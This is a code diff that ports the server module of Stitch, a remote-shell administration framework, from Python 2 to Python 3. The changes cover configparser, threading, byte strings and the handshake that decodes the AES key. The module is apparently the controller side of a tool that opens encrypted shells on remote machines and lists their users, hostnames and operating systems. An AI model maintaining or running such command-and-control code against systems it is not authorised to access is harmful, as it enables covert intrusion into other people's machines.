@@ -2,6 +2,7 @@
 # Copyright (c) 2017, Nathan Lopez
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
+import configparser
 from . import stitch_winshell
 from . import stitch_osxshell
 from . import stitch_lnxshell
@@ -20,9 +21,9 @@ class stitch_server(cmd.Cmd):
     def __init__(self):
         cmd.Cmd.__init__(self)
         path_name = get_cwd()
-        self.Config = ConfigParser.ConfigParser()
+        self.Config = configparser.ConfigParser()
         self.Config.read(hist_ini)
-        self.aes_lib = ConfigParser.ConfigParser()
+        self.aes_lib = configparser.ConfigParser()
         self.aes_lib.read(st_aes_lib)
         self.prompt = "{} {} ".format(st_tag,path_name)
         display_banner()
@@ -95,7 +96,7 @@ class stitch_server(cmd.Cmd):
         except Exception as e:
             self.server_thread='Failed'
             return
-        self.server_thread = threading.currentThread()
+        self.server_thread = threading.current_thread()
         while True:
             if not self.server_running:
                 break
@@ -132,7 +133,7 @@ class stitch_server(cmd.Cmd):
         return buf
 
     def receive(self,sock,encryption=True):
-        full_response = ""
+        full_response = b""
         while True:
             lengthbuf = self.recvall(sock, 4, encryption=False)
             length, = struct.unpack('!i', lengthbuf)
@@ -168,7 +169,7 @@ class stitch_server(cmd.Cmd):
         if line != '':
             try:
                 os.chdir(line)
-                print
+                print()
             except Exception as e:
                 st_print("[*] {}\n".format(e))
         else:
@@ -294,7 +295,7 @@ class stitch_server(cmd.Cmd):
             print ('   User: {}\n   Hostname: {}\n'
             '   Operating System: {}\n'.format(n_user, n_hostname, n_os))
             i += 1
-        print
+        print()
 
     def do_shell (self,line):
         if len(line.split()) != 1:
@@ -308,8 +309,9 @@ class stitch_server(cmd.Cmd):
                 del self.inf_port[self.target]
                 try:
                     st_confirm = self.receive(self.conn,encryption=False)
-                    if st_confirm == base64.b64encode('stitch_shell'):
-                        conn_aes = self.receive(self.conn,encryption=False)
+                    if st_confirm == base64.b64encode(b'stitch_shell'):
+                        conn_aes_bytes = self.receive(self.conn,encryption=False)
+                        conn_aes = conn_aes_bytes.decode('utf-8') if isinstance(conn_aes_bytes, bytes) else conn_aes_bytes
                         if conn_aes in self.aes_lib.sections():
                             self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
                             self.aes_enc = base64.b64decode(self.aes_enc)
@@ -383,8 +385,9 @@ class stitch_server(cmd.Cmd):
                 self.client.settimeout(8)
                 self.client.connect((self.target, self.port))
                 st_confirm = self.receive(self.client,encryption=False)
-                if st_confirm == base64.b64encode('stitch_shell'):
-                    conn_aes = self.receive(self.client,encryption=False)
+                if st_confirm == base64.b64encode(b'stitch_shell'):
+                    conn_aes_bytes = self.receive(self.client,encryption=False)
+                    conn_aes = conn_aes_bytes.decode('utf-8') if isinstance(conn_aes_bytes, bytes) else conn_aes_bytes
                     if conn_aes in self.aes_lib.sections():
                         self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
                         self.aes_enc = base64.b64decode(self.aes_enc)
@@ -439,7 +442,7 @@ class stitch_server(cmd.Cmd):
         return True
 
     def do_EOF(self, line):
-        print
+        print()
         return self.do_exit(line)
 
 ################################################################################
